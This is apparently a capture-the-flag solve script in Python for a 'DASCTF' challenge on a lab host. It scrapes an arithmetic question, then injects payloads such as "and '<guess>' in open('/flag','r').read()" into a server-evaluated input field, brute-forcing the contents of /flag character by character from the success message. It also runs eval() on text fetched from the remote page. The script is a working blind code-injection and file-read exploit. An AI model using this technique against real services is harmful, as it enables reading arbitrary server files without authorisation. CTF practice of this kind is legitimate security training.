#!/usr/bin/env python3
# coding=utf-8
import requests
from bs4 import BeautifulSoup
session = requests.session()
url = 'http://10.51.0.34:80/'
webdata = session.get(url).text
# print(webdata)
soup = BeautifulSoup(webdata,features='html.parser')
# print(soup)
qtext = soup.find_all('h4')
answer = eval(qtext[0].text[:-1])
# print(qtext)
# print(qtext[0].text[:-1])
# print(answer)
s='abcdefghijkmnlopqrstuvwxyz0123456789{}'
flag='DASCTF{'
for i in range(40):
    for j in s:
        payload = str(answer) + " and '"+flag+j+"' in open('/flag','r').read()"
        # print(payload)
        data = {'input':payload}
        result = session.post(url,data=data).text
        # print(result)
        if 'Congratulations' in result:
            flag = flag + j
            print(flag)
            break
        soup = BeautifulSoup(result, features='html.parser')
        qtext = soup.find_all('h4')
        answer = eval(qtext[0].text[:-1])
print(flag)